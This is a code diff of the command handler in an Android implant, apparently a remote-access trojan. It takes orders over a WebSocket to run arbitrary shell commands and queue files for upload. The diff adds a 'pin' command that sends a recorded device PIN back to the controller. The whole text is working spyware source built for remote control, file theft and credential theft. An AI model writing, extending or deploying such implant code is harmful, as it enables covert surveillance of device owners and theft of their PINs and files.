@@ -1,34 +1,57 @@
 package com.cooperthecoder.implant.command
 
+import android.content.Context
 import android.util.Log
+import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import com.cooperthecoder.implant.data.UploadQueue
 import com.cooperthecoder.implant.model.Command
 import okhttp3.WebSocket
 import java.io.BufferedReader
 import java.io.InputStreamReader
 
-class CommandHandler(val command: Command, val socket: WebSocket) {
+class CommandHandler(val context: Context, val command: Command, val socket: WebSocket) {
+    object Commands {
+        const val EXECUTE = "execute"
+        const val REPLY = "reply"
+        const val UPLOAD = "upload"
+        const val PIN = "pin"
+    }
     fun handle() {
         when (command.command) {
-            CommandListener.EXECUTE -> {
+            Commands.EXECUTE -> {
                 val shellCommand = command.arguments["shell_command"]
                 if (shellCommand != null) {
                     handleExecute(shellCommand)
+                } else {
+                    reply("", "Required argument: shell_command")
                 }
             }
 
-            CommandListener.REPLY -> {
+            Commands.REPLY -> {
                 val nonce = command.arguments["nonce"]
                 val output = command.arguments["output"]
                 if (nonce != null && output != null) {
                     handleReply(nonce, output)
+                } else {
+                    reply("", "Required arguments: nonce, output")
                 }
             }
 
-            CommandListener.UPLOAD -> {
+            Commands.UPLOAD -> {
                 val filename = command.arguments["filename"]
                 if (filename != null) {
                     handleUpload(filename)
+                } else {
+                    reply("", "Required argument: filename")
+                }
+            }
+
+            Commands.PIN -> {
+                val pin = SharedPreferencesQuery.getNextPin(context)
+                if (pin != null) {
+                    handlePin(pin)
+                } else {
+                    reply("", "No PIN recorded yet")
                 }
             }
         }
@@ -61,6 +84,10 @@ class CommandHandler(val command: Command, val socket: WebSocket) {
         Log.d(CommandListener.TAG, "Output is: $output")
     }
 
+    private fun handlePin(pin: String) {
+        reply(pin, "")
+    }
+
     private fun handleUpload(filename: String) {
         try {
             UploadQueue.push(filename)
@@ -83,7 +110,7 @@ class CommandHandler(val command: Command, val socket: WebSocket) {
                 "error" to error
         )
         val command = Command.Builder()
-                .command(CommandListener.REPLY)
+                .command(Commands.REPLY)
                 .arguments(arguments)
                 .build()
 
